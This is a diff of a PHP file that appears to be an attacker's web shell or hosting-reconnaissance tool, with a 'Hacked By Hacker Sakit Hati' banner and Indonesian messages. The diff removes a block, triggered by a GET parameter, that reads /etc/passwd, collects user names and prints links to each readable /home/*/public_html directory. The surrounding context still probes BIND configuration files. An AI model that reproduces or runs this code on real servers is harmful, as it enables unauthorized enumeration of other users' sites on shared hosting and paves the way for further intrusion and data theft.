@@ -1,6 +1,6 @@
- <?php 
+ <?php
 /**
-					Hacked By Hacker Sakit Hati
+
 
 		_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ _ ___ _  _ ____ ___ _ 
 		|__| |__| |    |_/  |___ |__/ [__  |__| |_/  |  |  |__| |__|  |  | 
@@ -126,43 +126,6 @@ echo '<center>';
 echo "<a href=\"https://www.facebook.com/Antonio.HsH\"><img class=\"logo\" src=\"https://3.bp.blogspot.com/-kqyfUPouqYk/VtYS0lU-ufI/AAAAAAAAADw/5707sF1NYwo/s1600/MemImg402.gif\" alt=\"Mionoon,..\"></a><br><br>\n";
 echo "<div class='result'><i><font color='#FF0000'>Server ini Tidak Bisa</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf </font>Tidak Di temukan </i></div><br></center>";
 }
-	}
-if ( isset($_GET['Nginceng']) )
-{
-set_time_limit(0);
-@$passwd = fopen('/etc/passwd','r');
-if (!$passwd) { die('<b>[+] ERROR | GA BISA BACA /etc/passwd [+]</b>'); }
-$pub = array();
-$users = array();
-$conf = array();
-$i = 0;
-while(!feof($passwd))
-{
-$str = fgets($passwd);
-if ($i > 10)
-{
-$pos = strpos($str,':');
-$username = substr($str,0,$pos);
-$dirz = '/home/'.$username.'/public_html/';
-if (($username != ''))
-{
-if (is_readable($dirz))
-{
-array_push($users,$username);
-array_push($pub,$dirz);
-}
-}
-}
-$i++;
-}
-echo '<br><br>';
-echo "<center><b>[+] Ngintip ".sizeof($pub)." Janda"." [+]</b><br/><br/>";
-foreach ($users as $user)
-{
-$path = "/home/$user/public_html/";
-echo "<a href='?y&#61;$path' target='_blank' style='font-weight:bold; color:#;'>$path</a><br>";
-}
-echo "<br>";
-echo '</center></body></html>';
-	}
+echo "</body></html>";
+echo '</center>';
 ?>
